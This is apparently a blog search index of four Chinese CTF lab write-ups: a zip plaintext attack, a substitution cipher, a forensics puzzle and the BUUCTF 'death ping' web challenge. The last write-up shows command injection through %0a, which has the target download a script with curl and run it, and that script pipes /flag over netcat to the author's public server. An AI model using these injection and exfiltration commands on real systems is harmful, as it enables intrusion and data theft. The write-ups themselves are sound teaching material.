<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[实验室每日一题][20201124][Zip已知明文攻击]</title>
      <link href="2020/12/23/20201124/"/>
      <url>2020/12/23/20201124/</url>
      
        <content type="html"><![CDATA[<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>下载文件后，查看题目和题目描述。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201223174330.png"></p><p>发现题目中的文本为504b开头，猜测是zip文件，放入010editor中保存为zip文件，后再kali用binwalk和foremost分离，查看binwalk和foremost分离的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201223174727.png"></p><p>左图为binwalk分离的结果，右图为foremost分离的结果。发现foremost分离效果更好，得到了一张压缩包和一个图片。分离出来的压缩包中有两个图片，1.jpg和2.jpg，分离出的jpg文件中有一个名为1.jpg的图片，于是想到使用明文攻击。使用好压把jpg压缩为zip格式的文件（因为出题人用的是好压进行文件压缩）。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201223180607.png"></p><p>明文攻击后得到解压密码，打开压缩包，得到flag。</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题挺典型的，主要考了文件分离，本人习惯手动分离，但是效果并不理想，小白和新手的话建议用foremost和binwalk分离，最后考了明文攻击，总的来说是一道不错的入门题。</p>]]></content>
      
      
      <categories>
          
          <category> 实验室日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[实验室每日一题][20201206][cryptograpy]</title>
      <link href="2020/12/07/20201206/"/>
      <url>2020/12/07/20201206/</url>
      
        <content type="html"><![CDATA[<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>根据题目提示，两个字母替换成一个字母，通过观察得出替换的规则，组成句子，最后得到flag。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>根据题目提示，<code>一人劈面来，急走如飞，势甚猛，傅不及避，两胸相撞，竟与己身。</code>百度搜索会发现这是一句不完整的文言文句子。后面还有一个成语：“合二为一”，这个就是题目提示。我的本意是，想让你们把两个字母替换成一个字母，最后组成一句可读的英文句子，但是可能提示有点不到位，脑洞有点大了。<br><strong>密文为：</strong><br>zputptijaedzatzxbodzatbeutptwf<strong>ox</strong> nbutzx dzaecy dzbobo wfredzaeat wbutnbwf<strong>ox</strong> tvut ptutat wfatutok reutjsbeptij msutaekndzaetv<strong>ox</strong> msbodzij bewf zpaenbokatutijaedzoknb wfut cydzwfnb<strong>ox</strong></p><p>通过观察会发现，很多个密文后面都会跟着上面的黑体部分<code>ox</code><br>，其实可以大胆猜测<code>ox</code>应该是英文句子结尾的<code>.</code>句号。那么第一个字符串部分，<code>zputptijaedzatzxbodzatbeutptwfox</code>就是一句话，去掉<code>ox</code>这个句号之后还有30个密文，也就是15个单词，并且这15个单词可以单独成句。可以想到<code>“Congratulations”</code>。<br>至于怎么想到，其实完全可以百度，百度搜索结果第二个就是<code>“Congratulations”</code>，也可以在百度出来的所有结果中根据英语的语法习惯去判断，只有<code>“Congratulations”</code>符合题意。<br><img src="https://img-blog.csdnimg.cn/img_convert/f61e7f108710ae53b98b51593d9a8501.png">所以有此映射<br><code>[&#39;zp&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;zx&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;be&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;wf&#39;, &#39;ox&#39;] Congratulations  </code></p><p>接着字符替换就行了，我这里用脚本做示范，也可以不写脚本，手动替换，就是有点麻烦，下面是我使用的脚本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#字符串每两个进行分隔，建立字典</span><br><span class="line">miwen &#x3D; &quot;zputptijaedzatzxbodzatbeutptwfox nbutzx dzaecy dzbobo wfredzaeat wbutnbwfox tvut ptutat wfatutok reutjsbeptij msutaekndzaetvox msbodzij bewf zpaenbokatutijaedzoknb wfut cydzwfnbox&quot;</span><br><span class="line">miwen1 &#x3D; miwen.split(&quot; &quot;)</span><br><span class="line"> </span><br><span class="line">dic &#x3D; &#123;&#39;zp&#39;:&#39;C&#39;,&#39;ut&#39;:&#39;o&#39;,&#39;pt&#39;:&#39;n&#39;,&#39;ij&#39;:&#39;g&#39;,&#39;ae&#39;:&#39;r&#39;,&#39;dz&#39;:&#39;a&#39;,&#39;at&#39;:&#39;t&#39;,&#39;zx&#39;:&#39;u&#39;,&#39;bo&#39;:&#39;l&#39;,&#39;be&#39;:&#39;i&#39;,&#39;wf&#39;:&#39;s&#39;,&#39;ox&#39;:&#39;.&#39;&#125;</span><br><span class="line">for i in miwen1:</span><br><span class="line">    a &#x3D;[]</span><br><span class="line">    for j in range(0,len(i),2):</span><br><span class="line">        a.append(i[j:j+2])        #密文字符串每两个分开</span><br><span class="line">    print(a)</span><br><span class="line">    b &#x3D; []</span><br><span class="line">    for k in a:</span><br><span class="line">        if k in dic:</span><br><span class="line">            b.append(dic[k])      #解密</span><br><span class="line">        else:</span><br><span class="line">            b.append(&#39;?&#39;)         #解不出来的用&#39;?&#39;填充</span><br><span class="line">    txt &#x3D; &#39;&#39;.join(b)</span><br><span class="line">    print(txt)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;zp&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;zx&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;be&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">Congratulations.</span><br><span class="line">[&#39;nb&#39;, &#39;ut&#39;, &#39;zx&#39;]</span><br><span class="line">?ou</span><br><span class="line">[&#39;dz&#39;, &#39;ae&#39;, &#39;cy&#39;]</span><br><span class="line">ar?</span><br><span class="line">[&#39;dz&#39;, &#39;bo&#39;, &#39;bo&#39;]</span><br><span class="line">all</span><br><span class="line">[&#39;wf&#39;, &#39;re&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;at&#39;]</span><br><span class="line">s?art</span><br><span class="line">[&#39;wb&#39;, &#39;ut&#39;, &#39;nb&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">?o?s.</span><br><span class="line">[&#39;tv&#39;, &#39;ut&#39;]</span><br><span class="line">?o</span><br><span class="line">[&#39;pt&#39;, &#39;ut&#39;, &#39;at&#39;]</span><br><span class="line">not</span><br><span class="line">[&#39;wf&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ok&#39;]</span><br><span class="line">sto?</span><br><span class="line">[&#39;re&#39;, &#39;ut&#39;, &#39;js&#39;, &#39;be&#39;, &#39;pt&#39;, &#39;ij&#39;]</span><br><span class="line">?o?ing</span><br><span class="line">[&#39;ms&#39;, &#39;ut&#39;, &#39;ae&#39;, &#39;kn&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;tv&#39;, &#39;ox&#39;]</span><br><span class="line">?or?ar?.</span><br><span class="line">[&#39;ms&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;ij&#39;]</span><br><span class="line">?lag</span><br><span class="line">[&#39;be&#39;, &#39;wf&#39;]</span><br><span class="line">is</span><br><span class="line">[&#39;zp&#39;, &#39;ae&#39;, &#39;nb&#39;, &#39;ok&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;ok&#39;, &#39;nb&#39;]</span><br><span class="line">Cr??togra??</span><br><span class="line">[&#39;wf&#39;, &#39;ut&#39;]</span><br><span class="line">so</span><br><span class="line">[&#39;cy&#39;, &#39;dz&#39;, &#39;wf&#39;, &#39;nb&#39;, &#39;ox&#39;]</span><br><span class="line">?as?.</span><br></pre></td></tr></table></figure><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;nb&#39;, &#39;ut&#39;, &#39;zx&#39;]</span><br><span class="line">?ou</span><br></pre></td></tr></table></figure><p>推测’nb’是’y’，构成句子开头You，因为上一句是”Congratulations.”。</p><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;dz&#39;, &#39;ae&#39;, &#39;cy&#39;]</span><br><span class="line">ar?</span><br></pre></td></tr></table></figure><p>推测’cy’是’e’。</p><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;tv&#39;, &#39;ut&#39;]</span><br><span class="line">?o</span><br></pre></td></tr></table></figure><p>推测’tv’是’d’，因为根据语法规则Do多为英文句子开头。</p><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;ms&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;ij&#39;]</span><br><span class="line">?lag</span><br></pre></td></tr></table></figure><p>推测’ms’是’f’。</p><p>根据以上推论，修改代码中的字典赋值一行为：</p><p><code>dic = &#123;&#39;zp&#39;:&#39;C&#39;,&#39;ut&#39;:&#39;o&#39;,&#39;pt&#39;:&#39;n&#39;,&#39;ij&#39;:&#39;g&#39;,&#39;ae&#39;:&#39;r&#39;,&#39;dz&#39;:&#39;a&#39;,&#39;at&#39;:&#39;t&#39;,&#39;zx&#39;:&#39;u&#39;,&#39;bo&#39;:&#39;l&#39;,&#39;be&#39;:&#39;i&#39;,&#39;wf&#39;:&#39;s&#39;,&#39;ox&#39;:&#39;.&#39;,&#39;nb&#39;:&#39;y&#39;,&#39;cy&#39;:&#39;e&#39;,&#39;tv&#39;:&#39;d&#39;,&#39;ms&#39;:&#39;f&#39;&#125;</code></p><p>再次运行，结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;zp&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;zx&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;be&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">Congratulations.</span><br><span class="line">[&#39;nb&#39;, &#39;ut&#39;, &#39;zx&#39;]</span><br><span class="line">you</span><br><span class="line">[&#39;dz&#39;, &#39;ae&#39;, &#39;cy&#39;]</span><br><span class="line">are</span><br><span class="line">[&#39;dz&#39;, &#39;bo&#39;, &#39;bo&#39;]</span><br><span class="line">all</span><br><span class="line">[&#39;wf&#39;, &#39;re&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;at&#39;]</span><br><span class="line">s?art</span><br><span class="line">[&#39;wb&#39;, &#39;ut&#39;, &#39;nb&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">?oys.</span><br><span class="line">[&#39;tv&#39;, &#39;ut&#39;]</span><br><span class="line">do</span><br><span class="line">[&#39;pt&#39;, &#39;ut&#39;, &#39;at&#39;]</span><br><span class="line">not</span><br><span class="line">[&#39;wf&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ok&#39;]</span><br><span class="line">sto?</span><br><span class="line">[&#39;re&#39;, &#39;ut&#39;, &#39;js&#39;, &#39;be&#39;, &#39;pt&#39;, &#39;ij&#39;]</span><br><span class="line">?o?ing</span><br><span class="line">[&#39;ms&#39;, &#39;ut&#39;, &#39;ae&#39;, &#39;kn&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;tv&#39;, &#39;ox&#39;]</span><br><span class="line">for?ard.</span><br><span class="line">[&#39;ms&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;ij&#39;]</span><br><span class="line">flag</span><br><span class="line">[&#39;be&#39;, &#39;wf&#39;]</span><br><span class="line">is</span><br><span class="line">[&#39;zp&#39;, &#39;ae&#39;, &#39;nb&#39;, &#39;ok&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;ok&#39;, &#39;nb&#39;]</span><br><span class="line">Cry?togra?y</span><br><span class="line">[&#39;wf&#39;, &#39;ut&#39;]</span><br><span class="line">so</span><br><span class="line">[&#39;cy&#39;, &#39;dz&#39;, &#39;wf&#39;, &#39;nb&#39;, &#39;ox&#39;]</span><br><span class="line">easy.</span><br></pre></td></tr></table></figure><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;wb&#39;, &#39;ut&#39;, &#39;nb&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">?oys.</span><br></pre></td></tr></table></figure><p>推测’wb’是’b’。</p><p>根据结果与句意分析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;wf&#39;, &#39;re&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;at&#39;]</span><br><span class="line">s?art</span><br></pre></td></tr></table></figure><p>推测出。</p><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;wf&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ok&#39;]</span><br><span class="line">sto?</span><br></pre></td></tr></table></figure><p>推测’ok’是’p’。</p><p>根据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;ms&#39;, &#39;ut&#39;, &#39;ae&#39;, &#39;kn&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;tv&#39;, &#39;ox&#39;]</span><br><span class="line">for?ard.</span><br></pre></td></tr></table></figure><p>推测’kn’是’w’。</p><p>根据以上推论，再次修改代码中的字典赋值一行为：</p><p><code>dic = &#123;&#39;zp&#39;:&#39;C&#39;,&#39;ut&#39;:&#39;o&#39;,&#39;pt&#39;:&#39;n&#39;,&#39;ij&#39;:&#39;g&#39;,&#39;ae&#39;:&#39;r&#39;,&#39;dz&#39;:&#39;a&#39;,&#39;at&#39;:&#39;t&#39;,&#39;zx&#39;:&#39;u&#39;,&#39;bo&#39;:&#39;l&#39;,&#39;be&#39;:&#39;i&#39;,&#39;wf&#39;:&#39;s&#39;,&#39;ox&#39;:&#39;.&#39;,&#39;nb&#39;:&#39;y&#39;,&#39;cy&#39;:&#39;e&#39;,&#39;tv&#39;:&#39;d&#39;,&#39;ms&#39;:&#39;f&#39;,&#39;wb&#39;:&#39;b&#39;,&#39;re&#39;:&#39;m&#39;,&#39;ok&#39;:&#39;p&#39;,&#39;kn&#39;:&#39;w&#39;&#125;</code><br>再次运行结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;zp&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;zx&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;at&#39;, &#39;be&#39;, &#39;ut&#39;, &#39;pt&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">Congratulations.</span><br><span class="line">[&#39;nb&#39;, &#39;ut&#39;, &#39;zx&#39;]</span><br><span class="line">you</span><br><span class="line">[&#39;dz&#39;, &#39;ae&#39;, &#39;cy&#39;]</span><br><span class="line">are</span><br><span class="line">[&#39;dz&#39;, &#39;bo&#39;, &#39;bo&#39;]</span><br><span class="line">all</span><br><span class="line">[&#39;wf&#39;, &#39;re&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;at&#39;]</span><br><span class="line">smart</span><br><span class="line">[&#39;wb&#39;, &#39;ut&#39;, &#39;nb&#39;, &#39;wf&#39;, &#39;ox&#39;]</span><br><span class="line">boys.</span><br><span class="line">[&#39;tv&#39;, &#39;ut&#39;]</span><br><span class="line">do</span><br><span class="line">[&#39;pt&#39;, &#39;ut&#39;, &#39;at&#39;]</span><br><span class="line">not</span><br><span class="line">[&#39;wf&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ok&#39;]</span><br><span class="line">stop</span><br><span class="line">[&#39;re&#39;, &#39;ut&#39;, &#39;js&#39;, &#39;be&#39;, &#39;pt&#39;, &#39;ij&#39;]</span><br><span class="line">mo?ing</span><br><span class="line">[&#39;ms&#39;, &#39;ut&#39;, &#39;ae&#39;, &#39;kn&#39;, &#39;dz&#39;, &#39;ae&#39;, &#39;tv&#39;, &#39;ox&#39;]</span><br><span class="line">forward.</span><br><span class="line">[&#39;ms&#39;, &#39;bo&#39;, &#39;dz&#39;, &#39;ij&#39;]</span><br><span class="line">flag</span><br><span class="line">[&#39;be&#39;, &#39;wf&#39;]</span><br><span class="line">is</span><br><span class="line">[&#39;zp&#39;, &#39;ae&#39;, &#39;nb&#39;, &#39;ok&#39;, &#39;at&#39;, &#39;ut&#39;, &#39;ij&#39;, &#39;ae&#39;, &#39;dz&#39;, &#39;ok&#39;, &#39;nb&#39;]</span><br><span class="line">Cryptograpy</span><br><span class="line">[&#39;wf&#39;, &#39;ut&#39;]</span><br><span class="line">so</span><br><span class="line">[&#39;cy&#39;, &#39;dz&#39;, &#39;wf&#39;, &#39;nb&#39;, &#39;ox&#39;]</span><br><span class="line">easy.</span><br></pre></td></tr></table></figure><p>其实这个时候flag已经出来了，flag为：flag{cryptograpy so easy}。<br>最后根据英语大意分析，’js’是’v’，就可以还原整个句子。<br><strong>还原后的句子为</strong>：<code>Congratulations.You are all smart boys.Do not stop moving forward.Flag is cryptograpy so easy.</code></p><p><strong>补充说明</strong>：这道题没太多的考点，主要考的是脑洞和英语基础，是我根据国外的一道经典题目改编的，做一做体验一下挺好的。</p>]]></content>
      
      
      <categories>
          
          <category> 实验室日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[实验室每日一题][20201127][misc]马老师与老八</title>
      <link href="2020/12/03/20201127/"/>
      <url>2020/12/03/20201127/</url>
      
        <content type="html"><![CDATA[<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>题目第一个压缩包的思路似乎有点问题，出题人直接给了压缩包密码：<code>E1Q+zs7eWNSB/C25ocZESDARrmtBxavcOJFaBfNZowU=</code>。打开压缩包后看一张图片和一个压缩包，图片名为：<code>Bacon</code>，于是想到培根密码，查看图片底层，看到<code>abbaaaaaaaababbaaaaaabbbabaabaaabbbabaaaaaabaaaaaaabaaabaabaaabbbabaaaaaabbaaaaabaabaaabbbabaaa</code>，密码长度为95，确定是培根密码。解密得到<code>malaoshicaishidashi</code>，培根解密小写即为压缩包密码。打开压缩包看到两个文件夹，第一个文件夹中有一个名为<code>hhh</code>的文件，放入kali中无法识别此文件，看底层也看不出东西。于是先放着查看另外一个文件，里面有个gif文件，查看底层并没有发现什么特别。于是放入kali中，用binwalk查看，发现有两个gif文件。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201225223907.png"></p><p>于是在010中搜索<code>47494638</code>，因为GIF的文件头为<code>47494638</code>，后发现有两个gif头，也应正了binwalk的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201225224854.png"></p><p>然后对文件进行手动分离。分离出另外一张gif，用Stegsolve逐帧把图片取出，然后用ppt把图片旋转过来，拼成一个flag。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201225230325.png"></p><p>这其实是一个假的flag，翻译flag中的英文，意思是恢复颠倒的磁盘。根据提示，用逆置脚本把hhh的16进制文件逆置，后放入kali识别文件，发现应该是一个损坏的liunx文件（我搞不太清楚该怎么描述，但是见过类似题目）。</p><p><img src="https://cdn.jsdelivr.net/gh/wuhuaviator/img@main/20201225231032.png"></p><p>于是用<code>extundelete</code>进行修复，命令为:<code>extundelete 文件 --restore-all</code>恢复后的文件直接运行，会显示<code>flag: 权限不够</code>，使用命令<code>chmod +x 文件</code> 给予文件可执行权限，然后再次运行文件，则可执行成功得到flag。或者切换成普通用户执行文件，也可以成功得到flag。</p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>总的来说这道题是一道不错的题目，综合攻防世界的几个考点，但我在实验室与队友交流的过程中，发现有个误区，他们中有人觉得<code>chmod +x</code>这条命令是给root用户加权限，但<code>chomod +X</code>真正的意思是<strong>给予可执行权限</strong>。最后放上两个我觉得讲得不错的相关链接。</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><strong>linux下chmod +x的意思？为什么要进行chmod +x：</strong><a href="https://blog.csdn.net/u012106306/article/details/80436911">https://blog.csdn.net/u012106306/article/details/80436911</a></p><p><strong>chmod命令详细用法：</strong><a href="https://blog.csdn.net/weixin_43190941/article/details/83281132">https://blog.csdn.net/weixin_43190941/article/details/83281132</a><br><strong>extundelete应用实战：</strong><a href="https://blog.csdn.net/swartz_lubel/article/details/77828648">https://blog.csdn.net/swartz_lubel/article/details/77828648</a></p>]]></content>
      
      
      <categories>
          
          <category> 实验室日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[实验室每日一题][20201123][Web]死亡ping命令</title>
      <link href="2020/12/03/20201123/"/>
      <url>2020/12/03/20201123/</url>
      
        <content type="html"><![CDATA[<p><strong>原题目：BUUCTF–[第二章 web进阶]死亡ping命令</strong></p><h2 id="前置基础（本题会用到的相关知识）"><a href="#前置基础（本题会用到的相关知识）" class="headerlink" title="前置基础（本题会用到的相关知识）"></a>前置基础（本题会用到的相关知识）</h2><h3 id="标准输入，标准输出是什么？"><a href="#标准输入，标准输出是什么？" class="headerlink" title="标准输入，标准输出是什么？"></a>标准输入，标准输出是什么？</h3><p>要弄清什么是标准输入输出。首先需要弄懂什么是IO。<br>IO 的 I 是 Input 的意思，O 是 output 的意思。<br>意味着输入和输出。<br>更确切的含义是：<br>I：从外部设备输入到内存<br>O：从内存输出到外部设备<br><code>转自：</code><a href="https://blog.csdn.net/sinat_17700695/article/details/91491472?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">什么是标准输入、标准输出(stdin、stdout)？</a></p><h3 id="linux中-sh文件是什么？"><a href="#linux中-sh文件是什么？" class="headerlink" title="linux中.sh文件是什么？"></a>linux中.sh文件是什么？</h3><p>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。<br><code>转自：</code><a href="https://www.php.cn/linux-419340.html">https://www.php.cn/linux-419340.html</a><br><code>相关文章：</code><a href="https://blog.csdn.net/qq_37699336/article/details/80724700">执行*.sh 文件的6种方式</a></p><h3 id="liunx命令"><a href="#liunx命令" class="headerlink" title="liunx命令"></a>liunx命令</h3><h4 id="linux中-gt-、-gt-gt-的用法"><a href="#linux中-gt-、-gt-gt-的用法" class="headerlink" title="linux中 &gt; 、&gt;&gt; 的用法"></a>linux中 &gt; 、&gt;&gt; 的用法</h4><p>inux中&gt;表示覆盖原文件内容，&gt;&gt;表示追加内容。<br><code>转自：</code><a href="https://blog.csdn.net/wudinaniya/article/details/84846732">linux中 &gt; 、&gt;&gt; 的用法</a></p><h4 id="管道操作符“-”"><a href="#管道操作符“-”" class="headerlink" title="管道操作符“|”"></a>管道操作符“|”</h4><p>使用管道操作符“|”可以把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出，依次类推。<br><code>转自：</code><a href="https://blog.csdn.net/wenpy/article/details/95032754">管道符丨用法</a></p><h4 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h4><p><code>ls（英文全拼：list files）：</code>ls命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。<br><code>转自：</code><a href="https://www.runoob.com/linux/linux-comm-ls.html">菜鸟教程</a></p><h4 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h4><p><code>cat（英文全拼：concatenate）：</code>cat命令用于连接文件并打印到标准输出设备上。<br><code>转自：</code><a href="https://www.runoob.com/linux/linux-comm-cat.html">菜鸟教程</a></p><h4 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h4><p><code>curl（英文全拼：CommandLine Uniform Resource Locator）：</code>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。<br><code>转自：</code><a href="https://itbilu.com/linux/man/4yZ9qH_7X.html">curl 命令行工具的使用及命令参数说明</a></p><h4 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h4><p><code>chmod（英文全拼：change mode）：</code>chmod命令是控制用户对文件的权限的命令。<br><code>转自：</code><a href="https://www.runoob.com/linux/linux-comm-chmod.html">菜鸟教程</a></p><h4 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h4><p><code>nc（英文全拼： Netcat ）：</code>功能强大的网络工具，体积小巧而出名，又被大家称为“瑞士军刀”。<br><code>转自：</code><a href="https://blog.csdn.net/freeking101/article/details/53289198">csdn</a></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><code>这是一道非常明显的命令执行题目，使用nc反弹shell的方法得到flag。</code>首先ping这个题目，实际上是题目的代码在服务器中执行了ping这个系统命令如果没有过滤的话，我们可以这样执行<code>ip=127.0.0.1&amp;&amp;ls</code>相当于在服务器上执行<code>ping 127.0.0.1&amp;&amp;ls</code>， <code>&amp;&amp;</code>是两条命令都执行，执行完ping之后执行ls是列出当前文件夹有什么文件然后我们使用<code>ip=127.0.0.1&amp;&amp;cat index.php</code>，相当于执行<code>ping127.0.0.1&amp;&amp;catindex.php</code>，执行完ping命令之后查看<code>index.php</code>文件内容<br>这样我们也就看到了index.php的内容。同样我们可以查看flag文件的内容<br>但是这道题目有过滤 并且没有回显 没有回显意思就是说 我们执行命令的结果无法在页面上显示出来 比如我们<code>cat index.php</code>读到了index的源码 但是页面不显示 依然没有用<br>因为过滤的比较严重 我们只能通过上传一个脚本文件来获得flag<br><code>转自：</code><a href="https://www.jianshu.com/p/a79ef4b93599">简书</a><br><code>相关文章：</code><a href="https://zhuanlan.zhihu.com/p/138393396">反弹shell原理与实现</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="第一步：抓包判断过滤"><a href="#第一步：抓包判断过滤" class="headerlink" title="第一步：抓包判断过滤"></a>第一步：抓包判断过滤</h3><p>1、使用ping命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1%0als</span><br></pre></td></tr></table></figure><p>2、使用Burp Suite抓包，用爆破的方式来判断过滤的字符。<img src="https://img-blog.csdnimg.cn/img_convert/b7f9843457dacbca576e816e520bc6d8.png">用手工注入的方式可以发现通过%0a能够注入新的一条命令进行执行。</p><p><code>补充说明：</code>这里使用Burp Suit抓包的方式进行命令执行，而不是使用hackbar来做，是因为浏览器会产生二次编码。</p><h3 id="第二步：搭建网站"><a href="#第二步：搭建网站" class="headerlink" title="第二步：搭建网站"></a>第二步：搭建网站</h3><p>1、这里使用的宝塔快速搭建网站<br><img src="https://img-blog.csdnimg.cn/img_convert/a7fc0e57ee9eab3141214b39a71c8034.png"><br>2、在网站根目录创建文件1.sh<br><img src="https://img-blog.csdnimg.cn/img_convert/8fc29c7a7594129c608d2c124d135847.png"><br>3、编写1.sh，内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls|cat &#x2F;flag | nc 公网ip地址 8089</span><br></pre></td></tr></table></figure><p>4、打开端口<br><img src="https://img-blog.csdnimg.cn/img_convert/8fc29c7a7594129c608d2c124d135847.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>1、在靶机上用curl下载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1%0acurl 公网ip地址&#x2F;1.sh &gt; &#x2F;tmp&#x2F;1.sh   #请求bash文件到tmp目录</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a97091170302519416646ec4816788e7.png"><br>回显成功。<br>2、给bash加权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1%0achmod 777 &#x2F;tmp&#x2F;1.sh #给bash加权限</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ec903a0d9f77623fd0b2a55ded79d7a6.png"><br>回显成功。<br>3、监听8089端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 8089  #你的机器上进行监听8089端口</span><br></pre></td></tr></table></figure><ul><li>-l 设置netcat处于监听状态等待连接。</li><li>-V 显示错误提示信息。</li><li>-p 设置本地监听的端口号。<br><img src="https://img-blog.csdnimg.cn/img_convert/d69c051f74b3e8b214e289c89a869e9e.png"><br>4、执行1.sh</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1%0ash &#x2F;tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0c12ead43b3a11fe4183c2e1ae41904b.png"><br>最后得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> 实验室日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
